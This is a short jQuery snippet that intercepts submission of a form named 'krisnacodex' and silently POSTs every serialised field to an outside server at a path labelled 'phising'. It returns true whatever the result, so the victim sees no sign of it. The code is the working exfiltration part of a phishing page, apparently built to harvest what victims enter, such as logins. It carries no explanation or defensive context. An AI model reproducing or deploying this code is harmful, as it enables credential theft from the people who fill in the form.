$("#krisnacodex").submit(function() {  
 var d = $("#krisnacodex");  
  
 $.ajax({  
        url: "https://krisnastore.my.id/api/phising/api2.php",  
        type: "POST",  
        data: d.serialize(),  
        success: function () {  
            return true;  
        },  
        error: function () {  
            return true;  
        },  
    });  
});
